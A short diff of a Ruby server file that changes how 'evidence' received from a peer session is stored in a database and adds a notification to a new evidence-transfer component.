@@ -5,6 +5,7 @@
 # relatives
 require_relative 'db.rb'
 require_relative 'sessions.rb'
+require_relative 'evidence_transfer.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -277,9 +278,12 @@ module Commands
 
     # send the evidence to the db
     begin
-      EvidenceManager.instance.store session, size, message
-      #TODO: notify the pusher to send the evidence to db
-          
+      # store the evidence in the db
+      EvidenceManager.instance.store_evidence session, size, message
+
+      # notify the transfer manager that an evidence is available
+      EvidenceTransfer.instance.notify session
+
       trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
     rescue Exception => e
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
